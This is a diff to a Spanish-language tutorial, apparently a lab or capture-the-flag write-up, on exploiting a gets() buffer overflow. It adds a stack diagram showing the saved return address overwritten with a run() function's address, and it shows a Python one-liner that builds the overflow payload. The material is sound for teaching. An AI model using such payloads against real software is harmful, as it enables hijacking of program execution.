@@ -44,6 +44,26 @@ de un buffer overflow desde la función gets() del main
       0x08048444  run
       0x08048480  main
     [...]
+
+    high adr        
+    stack      
+    ------------- 
+    |           |
+    ------------- 
+    | eip       | <---------------- (0x08048444) adr run() 
+    ------------- -------|              AAAA  
+    | ebp       |        |              AAAA
+    -------------        |              AAAA
+    | ...       |        |    stack     AAAA
+    -------------        |--> frame     AAAA
+    | buff      | -------|----------------|
+    -------------        |
+    | ...       |        |
+    -------------        |
+    | esp       |        |
+    ------------- -------|
+    low adr
+
 15.- Generaremos el payload con python
   - Python2:
       python -c 'print "A"*76 + "\x44\x84\x04\x08"' > payload
